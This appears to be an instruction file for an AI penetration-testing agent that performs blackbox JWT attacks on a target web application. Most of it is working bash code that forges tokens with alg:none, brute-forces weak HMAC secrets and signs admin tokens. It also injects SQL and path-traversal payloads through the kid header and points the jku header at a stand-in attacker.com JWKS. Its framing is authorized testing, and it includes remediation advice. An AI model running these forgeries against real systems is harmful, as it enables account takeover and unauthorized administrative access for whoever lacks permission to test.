---
name: blackbox-jwt
description: >-
  Actively test a target web application's JWT implementation for security
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  captures JWT tokens from authentication endpoints, tests for algorithm
  confusion (alg:none, RS256→HS256 confusion), weak secret brute-force,
  missing expiry (exp), kid header injection (SQLi/path traversal), jku/x5u
  header injection for remote key loading, and claim manipulation. Writes
  confirmed findings with PoC scripts to pentest/jwt-results.md. Use when
  asked to find JWT vulnerabilities in a blackbox pentest.
---

# Blackbox JWT Vulnerability Detection

You are actively testing a web application's JWT (JSON Web Token) implementation without source code access. You will capture tokens, analyze their structure, and test for algorithm confusion, signature bypass, and claim manipulation.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Capture and Decode JWT

### Step 1: Obtain a Token

```bash
# Login and capture JWT
RESPONSE=$(curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}')

TOKEN=$(echo $RESPONSE | grep -oP '"(token|access_token|jwt)"\s*:\s*"\K[^"]+')
echo "Token: $TOKEN"
```

### Step 2: Decode All Three Parts

```bash
# Decode header
HEADER=$(echo $TOKEN | cut -d'.' -f1)
echo "=== HEADER ===" && echo $HEADER | base64 -d 2>/dev/null && echo

# Decode payload
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
echo "=== PAYLOAD ===" && echo $PAYLOAD | base64 -d 2>/dev/null && echo

# Note signature (not decodable)
echo "=== SIGNATURE (base64url) ===" && echo $TOKEN | cut -d'.' -f3
```

**Analyze and note**:
- `alg` in header: `HS256`, `RS256`, `ES256`, `none`
- `kid` field (if present): path-like? numeric? URL-like?
- `jku` or `x5u` field (if present): URL where public key is fetched
- Claims: `sub`, `role`, `email`, `exp`, `iat`, `iss`, `aud`
- Is `exp` set? When does it expire?

---

## Phase 2: Algorithm Confusion Attacks

### Test 1: alg:none (No Signature)

```bash
# Craft header with alg:none
NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | \
  base64 | tr '+/' '-_' | tr -d '=')

# Get and modify payload — elevate role to admin
ORIG_PAYLOAD=$(echo $TOKEN | cut -d'.' -f2 | \
  base64 -d 2>/dev/null | \
  sed 's/"role":"user"/"role":"admin"/' | \
  sed 's/"isAdmin":false/"isAdmin":true/')

MOD_PAYLOAD=$(echo -n "$ORIG_PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')

# Token with no signature
NONE_TOKEN="${NONE_HEADER}.${MOD_PAYLOAD}."
echo "Forged token: $NONE_TOKEN"

# Test it
curl -sk "<TARGET_URL>/api/admin/users" \
  -H "Authorization: Bearer $NONE_TOKEN" -D -

# Also try: alg="NONE", alg="None", alg="NoNe"
for ALG in "none" "NONE" "None" "NoNe"; do
  H=$(echo -n "{\"alg\":\"$ALG\",\"typ\":\"JWT\"}" | base64 | tr '+/' '-_' | tr -d '=')
  T="${H}.${MOD_PAYLOAD}."
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "<TARGET_URL>/api/me" -H "Authorization: Bearer $T")
  echo "alg=$ALG → HTTP $STATUS"
done
```

### Test 2: RS256 → HS256 Confusion (Algorithm Confusion Attack)

If the original token uses `RS256` and you can obtain the server's **public key**:

```bash
# Get public key (try common endpoints)
for ENDPOINT in /.well-known/jwks.json /jwks.json /api/keys /oauth/jwks; do
  curl -sk -o /dev/null -w "$ENDPOINT → %{http_code}\n" "<TARGET_URL>$ENDPOINT"
done

# If JWKS found, extract the public key PEM
curl -sk "<TARGET_URL>/.well-known/jwks.json"
# Convert to PEM and use as HMAC secret — requires python-jwt or jwt-tool
```

### Test 3: Weak Secret Brute-Force (HS256)

```bash
# Test common secrets
HEADER_PAYLOAD="$(echo $TOKEN | cut -d'.' -f1).$(echo $TOKEN | cut -d'.' -f2)"
ACTUAL_SIG=$(echo $TOKEN | cut -d'.' -f3)

for SECRET in secret password changeme admin 12345678 jwt-secret secretkey \
              default your-256-bit-secret your-secret mySecret Token@123 \
              "secret123" "password123" "app-secret" "jwt_secret"; do
  COMPUTED=$(echo -n "$HEADER_PAYLOAD" | \
    openssl dgst -sha256 -hmac "$SECRET" -binary | \
    base64 | tr '+/' '-_' | tr -d '=')
  if [ "$COMPUTED" = "$ACTUAL_SIG" ]; then
    echo "[FOUND] JWT secret: '$SECRET'"
    break
  else
    echo "[ ] '$SECRET'"
  fi
done
```

If secret found, forge admin token:
```bash
SECRET="<FOUND_SECRET>"
HEADER_B64=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
SIG=$(echo -n "${HEADER_B64}.${PAYLOAD_B64}" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr '+/' '-_' | tr -d '=')
ADMIN_TOKEN="${HEADER_B64}.${PAYLOAD_B64}.${SIG}"

curl -sk "<TARGET_URL>/api/admin/users" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

---

## Phase 3: kid Header Injection

If the JWT header contains a `kid` field:

### Test 1: SQL Injection via kid

```bash
# Check header for kid
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null

# If kid present, forge token where kid causes SQLi returning empty string
# Use "" as signing key (result of "SELECT '' FROM ...")
KID_PAYLOAD='{"kid":"x UNION SELECT '"'"''"'"' FROM INFORMATION_SCHEMA.TABLES--","alg":"HS256","typ":"JWT"}'
KID_HEADER=$(echo -n "$KID_PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')
MOD_PAYLOAD_B64=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
# Sign with empty string
SIG=$(echo -n "${KID_HEADER}.${MOD_PAYLOAD_B64}" | openssl dgst -sha256 -hmac "" -binary | base64 | tr '+/' '-_' | tr -d '=')
TOKEN_KID="${KID_HEADER}.${MOD_PAYLOAD_B64}.${SIG}"

curl -sk "<TARGET_URL>/api/me" \
  -H "Authorization: Bearer $TOKEN_KID" -D -
```

### Test 2: Path Traversal via kid

```bash
# kid pointing to /dev/null (empty file =  empty HMAC key)
KID_PATH='{"kid":"/dev/null","alg":"HS256","typ":"JWT"}'
KID_HEADER=$(echo -n "$KID_PATH" | base64 | tr '+/' '-_' | tr -d '=')
SIG=$(echo -n "${KID_HEADER}.${MOD_PAYLOAD_B64}" | openssl dgst -sha256 -hmac "" -binary | base64 | tr '+/' '-_' | tr -d '=')
TOKEN_NULL="${KID_HEADER}.${MOD_PAYLOAD_B64}.${SIG}"

curl -sk "<TARGET_URL>/api/me" \
  -H "Authorization: Bearer $TOKEN_NULL" -D -
```

---

## Phase 4: jku / x5u Header Injection

If the JWT has `jku` or `x5u` in the header, the server fetches the key from that URL:

```bash
# Original header might have: {"jku":"https://target.com/keys","alg":"RS256"}
# Modify jku to your server hosting a crafted JWKS

CRAFT_HEADER=$(echo -n '{"jku":"https://attacker.com/jwks.json","alg":"RS256","typ":"JWT"}' | \
  base64 | tr '+/' '-_' | tr -d '=')

# Your attacker.com/jwks.json serves your own RSA public key
# Sign the token with your RSA private key
# (requires openssl RSA key pair + jwt_tool or python-jwt)
echo "Test jku injection by pointing to attacker-controlled JWKS"
```

---

## Phase 5: Claim Manipulation

```bash
# If expiry is far in the future, check if exp is validated at all
# Forge token with no exp
NO_EXP_PAYLOAD=$(echo -n '{"sub":"1","role":"user"}' | base64 | tr '+/' '-_' | tr -d '=')
# Try with known secret or alg:none

# Inject privilege claims
ADMIN_CLAIM='{"sub":"1","role":"admin","isAdmin":true,"scope":"admin:read admin:write"}'
```

---

## Output Format

Write findings to `pentest/jwt-results.md`:

```markdown
# JWT Security Assessment Results

## Summary
- Algorithm: [HS256 / RS256 / alg:none accepted]
- Secret strength: [Weak (found: "secret") / Strong / Unknown]
- kid injection: [Tested / Vulnerable / Not present]
- jku injection: [Tested / Vulnerable / Not present]
- Expiry enforced: [Yes / No]

## Findings

### [CRITICAL] alg:none accepted — Complete signature bypass

- **Impact**: Attacker can forge any identity — including admin — with zero knowledge of secrets
- **PoC**:
  ```bash
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  PAYLOAD=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
  TOKEN="${HEADER}.${PAYLOAD}."

  curl -sk "https://target.com/api/admin/users" \
    -H "Authorization: Bearer $TOKEN"
  # Expected: HTTP 200 with full admin data — no secret needed
  ```
- **Remediation**: Explicitly specify allowed algorithms in JWT verification. Reject `alg:none` entirely. Example (Node.js): `jwt.verify(token, secret, { algorithms: ['HS256'] })`

### [CRITICAL] Weak JWT secret found: "secret"

- **Impact**: Attacker can forge tokens with any claims (admin role, arbitrary user ID)
- **PoC**:
  ```bash
  SECRET="secret"
  HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  PAYLOAD=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
  SIG=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr '+/' '-_' | tr -d '=')
  TOKEN="$HEADER.$PAYLOAD.$SIG"

  curl -sk "https://target.com/api/admin" -H "Authorization: Bearer $TOKEN"
  ```
- **Remediation**: Use a cryptographically random secret of at least 256 bits. Rotate the secret immediately.
```

---

## Important Reminders

- Test `alg:none` case variations — `none`, `NONE`, `None`, `nOnE` — some parsers are case-sensitive.
- The RS256→HS256 confusion requires obtaining the server's public key first.
- If the target uses OAuth/OIDC, the JWKS endpoint is often at `/.well-known/openid-configuration` → follow `jwks_uri`.
- `exp` not being checked is a Low/Medium finding individually but amplifies all other JWT bugs.
- Clean up: write directly to `pentest/jwt-results.md`.
